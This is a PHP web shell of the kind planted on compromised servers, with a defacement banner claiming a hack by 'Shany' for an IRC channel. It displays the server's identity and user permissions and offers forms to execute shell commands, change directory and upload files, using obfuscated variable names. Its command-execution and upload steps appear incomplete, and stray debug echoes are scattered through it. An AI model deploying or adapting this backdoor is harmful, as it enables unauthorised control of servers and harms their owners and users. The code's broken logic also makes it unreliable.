<?php
echo '[syslog]01
'; print '<style>body{font-family:trebuchet ms;font-size:16px;}hr{width:100%;height:2px;}</style>'; print '<center><h1>#worst @dal.net</h1></center>'; print '<center><h1>You have been hack By Shany with Love To #worst.</h1></center>'; print '<center><h1>Watch Your system Shany was here.</h1></center>'; print '<center><h1>Linux Shells</h1></center>'; print '<hr><hr>'; $sp7f6b42 = str_replace('\\\\', '\\', $_POST['_cwd']); $sped4617 = str_replace('\\\\', '\\', $_POST['_cmd']); $spc3418f = `uname -a`; $sp325f73 = `pwd`; $sp098cc3 = `id`; echo '[syslog]01-1
'; if ($sp7f6b42 == '') { $sp7f6b42 = $sp325f73; } print '<table>'; print '<tr><td><b>We are:</b></td><td>' . $_SERVER['REMOTE_HOST'] . ' (' . $_SERVER['REMOTE_ADDR'] . ')</td></tr>'; print '<tr><td><b>Server is:</b></td><td>' . $_SERVER['SERVER_SIGNATURE'] . '</td></tr>'; print "<tr><td><b>System type:</b></td><td>{$spc3418f}</td></tr>"; print "<tr><td><b>Our permissions:</b></td><td>{$sp098cc3}</td></tr>"; print '</table>'; print '<hr><hr>'; echo '[syslog]02
'; if ($_POST['_act'] == 'List files!') { $sped4617 = 'ls -la'; } print '<form method=post enctype="multipart/form-data"><table>'; print '<tr><td><b>Execute command:</b></td><td><input size=100 name="_cmd" value="' . $sped4617 . '"></td>'; print '<td><input type=submit name=_act value="Execute!"></td></tr>'; print '<tr><td><b>Change directory:</b></td><td><input size=100 name="_cwd" value="' . $sp7f6b42 . '"></td>'; print '<td><input type=submit name=_act value="List files!"></td></tr>'; print '<tr><td><b>Upload file:</b></td><td><input size=85 type=file name=_upl></td>'; print '<td><input type=submit name=_act value="Upload!"></td></tr>'; print '</table></form><hr><hr>'; $sped4617 = str_replace('\\"', '"', $sped4617); $sped4617 = str_replace('\\\\\'', '\\\'', $sped4617); echo '[syslog]03
'; if ($_POST['_act'] == 'Upload!') { if ($_FILES['_upl']['error'] != UPLOAD_ERR_OK) { print '<center><b>Error while uploading file!</b></center>'; } else { print '<center><pre>'; print '</pre><b>File uploaded successfully!</b></center>'; } } else { print '

<!-- OUTPUT STARTS HERE -->
<pre>
'; $sped4617 = 'cd ' . $sp7f6b42 . ';' . $sped4617; print '
</pre>
<!-- OUTPUT ENDS HERE -->

</center><hr><hr><center><b>Command completed</b></center>'; } echo '[syslog]04
'; die;